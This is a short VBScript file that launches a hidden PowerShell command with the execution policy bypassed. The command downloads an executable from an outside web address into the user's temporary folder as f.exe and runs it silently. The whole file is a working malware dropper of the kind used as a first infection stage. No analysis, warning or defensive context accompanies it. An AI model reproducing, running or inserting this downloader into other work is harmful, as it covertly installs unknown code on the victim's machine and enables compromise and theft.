Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -w Hidden -ep Bypass -c ""iwr https://quantumtrade.us/public/ -OutFile $env:TEMP\f.exe; cmd /c $env:TEMP\f.exe""", 0, False